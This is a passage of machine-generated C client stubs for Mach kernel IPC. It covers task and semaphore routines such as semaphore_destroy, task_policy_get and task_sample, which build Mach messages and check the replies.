#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__semaphore_create_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__semaphore_create_t__defined */

	__DeclareSendRpc(3418, "semaphore_create")

	InP->NDR = NDR_record;

	InP->policy = policy;

	InP->value = value;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3418;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3418, "semaphore_create")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3418, "semaphore_create")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__semaphore_create_t__defined)
	check_result = __MIG_check__Reply__semaphore_create_t((__Reply__semaphore_create_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__semaphore_create_t__defined) */

	*semaphore = Out0P->semaphore.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__semaphore_destroy_t__defined)
#define __MIG_check__Reply__semaphore_destroy_t__defined

mig_internal kern_return_t __MIG_check__Reply__semaphore_destroy_t(__Reply__semaphore_destroy_t *Out0P)
{

	typedef __Reply__semaphore_destroy_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3519) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__semaphore_destroy_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine semaphore_destroy */
mig_external kern_return_t semaphore_destroy
(
	task_t task,
	semaphore_t semaphore
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__semaphore_destroy_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__semaphore_destroy_t__defined */

	__DeclareSendRpc(3419, "semaphore_destroy")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t semaphoreTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		17,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->semaphore = semaphoreTemplate;
	InP->semaphore.name = semaphore;
#else	/* UseStaticTemplates */
	InP->semaphore.name = semaphore;
	InP->semaphore.disposition = 17;
	InP->semaphore.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3419;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3419, "semaphore_destroy")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3419, "semaphore_destroy")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__semaphore_destroy_t__defined)
	check_result = __MIG_check__Reply__semaphore_destroy_t((__Reply__semaphore_destroy_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__semaphore_destroy_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_policy_set_t__defined)
#define __MIG_check__Reply__task_policy_set_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_policy_set_t(__Reply__task_policy_set_t *Out0P)
{

	typedef __Reply__task_policy_set_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3520) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_policy_set_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_policy_set */
mig_external kern_return_t task_policy_set
(
	task_policy_set_t task,
	task_policy_flavor_t flavor,
	task_policy_t policy_info,
	mach_msg_type_number_t policy_infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__task_policy_set_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_policy_set_t__defined */

	__DeclareSendRpc(3420, "task_policy_set")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (policy_infoCnt > 16) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->policy_info, (const char *) policy_info, 4 * policy_infoCnt);

	InP->policy_infoCnt = policy_infoCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 64) + ((4 * policy_infoCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3420;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3420, "task_policy_set")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3420, "task_policy_set")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_policy_set_t__defined)
	check_result = __MIG_check__Reply__task_policy_set_t((__Reply__task_policy_set_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_policy_set_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_policy_get_t__defined)
#define __MIG_check__Reply__task_policy_get_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_policy_get_t(__Reply__task_policy_get_t *Out0P, __Reply__task_policy_get_t **Out1PP)
{

	typedef __Reply__task_policy_get_t __Reply __attribute__((unused));
	__Reply *Out1P;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3521) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 64)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	msgh_size_delta = Out0P->policy_infoCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->policy_infoCnt > 16 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 64)) / 4< Out0P->policy_infoCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 64) + Out0P->policy_infoCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 64);

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_policy_get_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_policy_get */
mig_external kern_return_t task_policy_get
(
	task_policy_get_t task,
	task_policy_flavor_t flavor,
	task_policy_t policy_info,
	mach_msg_type_number_t *policy_infoCnt,
	boolean_t *get_default
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		boolean_t get_default;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
		boolean_t get_default;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
		boolean_t get_default;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_policy_get_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_policy_get_t__defined */

	__DeclareSendRpc(3421, "task_policy_get")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*policy_infoCnt < 16)
		InP->policy_infoCnt = *policy_infoCnt;
	else
		InP->policy_infoCnt = 16;

	InP->get_default = *get_default;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3421;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3421, "task_policy_get")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3421, "task_policy_get")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_policy_get_t__defined)
	check_result = __MIG_check__Reply__task_policy_get_t((__Reply__task_policy_get_t *)Out0P, (__Reply__task_policy_get_t **)&Out1P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_policy_get_t__defined) */

	if (Out0P->policy_infoCnt > *policy_infoCnt) {
		(void)memcpy((char *) policy_info, (const char *) Out0P->policy_info, 4 *  *policy_infoCnt);
		*policy_infoCnt = Out0P->policy_infoCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) policy_info, (const char *) Out0P->policy_info, 4 * Out0P->policy_infoCnt);

	*policy_infoCnt = Out0P->policy_infoCnt;

	*get_default = Out1P->get_default;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_sample_t__defined)
#define __MIG_check__Reply__task_sample_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_sample_t(__Reply__task_sample_t *Out0P)
{

	typedef __Reply__task_sample_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3522) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_sample_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_sample */
mig_external kern_return_t task_sample
(
	task_t task,
	mach_port_t reply
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t reply;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_sample_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_sample_t__defined */

	__DeclareSendRpc(3422, "task_sample")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t replyTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->reply = replyTemplate;
	InP->reply.name = reply;
#else	/* UseStaticTemplates */
	InP->reply.name = reply;
	InP->reply.disposition = 20;
	InP->reply.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3422;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3422, "task_sample")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3422, "task_sample")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_sample_t__defined)
	check_result = __MIG_check__Reply__task_sample_t((__Reply__task_sample_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_sample_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_policy_t__defined)
#define __MIG_check__Reply__task_policy_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_policy_t(__Reply__task_policy_t *Out0P)
{

	typedef __Reply__task_policy_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3523) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_policy_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_policy */
mig_external kern_return_t task_policy
(
	task_t task,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	boolean_t set_limit,
	boolean_t change
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		boolean_t set_limit;
		boolean_t change;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__task_policy_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_policy_t__defined */

	__DeclareSendRpc(3423, "task_policy")

	InP->NDR = NDR_record;

	InP->policy = policy;

	if (baseCnt > 5) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->base, (const char *) base, 4 * baseCnt);

	InP->baseCnt = baseCnt;

	msgh_size_delta = (4 * baseCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 20) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 20);

	InP->set_limit = set_limit;

	InP->change = change;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3423;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3423, "task_policy")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3423, "task_policy")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_policy_t__defined)
	check_result = __MIG_check__Reply__task_policy_t((__Reply__task_policy_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_policy_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_emulation_t__defined)
#define __MIG_check__Reply__task_set_emulation_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_emulation_t(__Reply__task_set_emulation_t *Out0P)
{

	typedef __Reply__task_set_emulation_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3524) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_emulation_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_emulation */
mig_external kern_return_t task_set_emulation
(
	task_t target_port,
	vm_address_t routine_entry_pt,
	int routine_number
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		vm_address_t routine_entry_pt;
		int routine_number;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
